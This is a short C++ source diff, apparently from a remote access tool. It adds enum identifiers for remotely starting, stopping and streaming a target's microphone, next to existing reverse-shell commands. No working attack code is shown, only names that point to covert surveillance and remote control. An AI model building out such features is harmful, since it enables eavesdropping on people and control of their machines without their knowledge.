@@ -24,6 +24,7 @@
 #include<vector>
 #include<cstring>
 #include<ctime>
+#include <mmsystem.h>
 
 #include "aes256/aes256.hpp"
 
@@ -50,7 +51,9 @@ namespace EnumIDS {
         ID_Panel_Label_Test,
         ID_Panel_Microphone,
         ID_Panel_Mic_CMB_Devices,
-        ID_Panel_Mic_BTN_Refresh
+        ID_Panel_Mic_BTN_Refresh,
+        ID_Panel_Mic_BTN_Escuchar,
+        ID_Panel_Mic_BTN_Detener
     };
 }
 
@@ -63,7 +66,10 @@ namespace EnumComandos {
         Reverse_Shell_Salida,
         Reverse_Shell_Finish,
         Mic_Refre_Dispositivos,
-        Mic_Refre_Resultado
+        Mic_Refre_Resultado,
+        Mic_Iniciar_Escucha,
+        Mic_Detener_Escucha,
+        Mic_Live_Packet
     };
 }
 
